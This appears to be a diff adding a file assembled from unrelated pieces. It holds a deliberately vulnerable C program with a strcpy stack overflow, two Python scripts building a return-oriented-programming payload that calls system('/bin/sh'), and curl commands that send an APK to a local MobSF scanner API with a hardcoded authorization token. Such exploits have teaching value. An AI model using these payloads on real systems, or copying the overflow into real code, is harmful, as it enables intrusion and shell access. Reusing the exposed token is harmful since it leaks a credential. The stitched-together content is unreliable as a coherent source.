@@ -1,0 +1,60 @@
+#include <stdio.h>
+#include <stdlib.h>
+void IShouldNeverBeCalled()
+{
+puts("I should never be called\n");
+exit(0);
+}
+void vulnerable(char *arg)
+{
+char buff[10];
+strcpy(buff,arg);
+}
+int main(int argc, char **argv)
+{
+vulnerable(argv[1]);
+return(0);
+}
+
+#!/usr/bin/env python
+
+import ropgen
+
+erand48 = 0x4087b9dc
+system = 0x40883bf0
+stackaddr = 0x407fff18
+
+rop =ropgen.RopGen()
+
+rop.set_dword(16, erand48)
+rop.set_dword(20, stackaddr) # stack address of /bin/sh
+rop.set_dword(32, system)
+rop.set_string(36, '/bin/sh\0')
+open('exp', 'wb').write(rop.build())
+
+#!/usr/bin/env python
+
+import ropgen
+
+erand48 = 0x4087b9dc
+system = 0x40883bf0
+stackaddr = 0x407fff38
+
+rop =ropgen.RopGen()
+
+rop.set_dword(16, erand48)
+rop.set_dword(20, stackaddr) # stack address of /bin/sh
+rop.set_dword(32, system)
+rop.set_string(36, '/bin/sh\0')
+open('exp', 'wb').write(rop.build())
+
+
+
+curl --fail --silent --show-error -F 'file=@/Users/Shared/Jenkins/Home/workspace/PacktTestAndroid/app/build/outputs/apk/app-debug.apk' http://localhost:8000/api/v1/upload -H "Authorization:61ecd74aec7b36f5a9fbf7ac77494932ab5fcf4e4661626d095b5ad449746998" | awk -F'[/"]' '{print $8}' >  hash.txt
+
+
+curl --fail --silent --show-error -X POST --url http://localhost:8000/api/v1/scan --data "scan_type=apk&file_name=app-debug.apk&hash=$(cat hash.txt)" -H "Authorization:61ecd74aec7b36f5a9fbf7ac77494932ab5fcf4e4661626d095b5ad449746998"
+
+
+curl --fail --silent --show-error  -K hash.txt -X POST --url http://localhost:8000/api/v1/download_pdf --data  "hash=$(cat hash.txt)&scan_type=apk" -H "Authorization:61ecd74aec7b36f5a9fbf7ac77494932ab5fcf4e4661626d095b5ad449746998" -o MobSF${BUILD_ID}.pdf
+
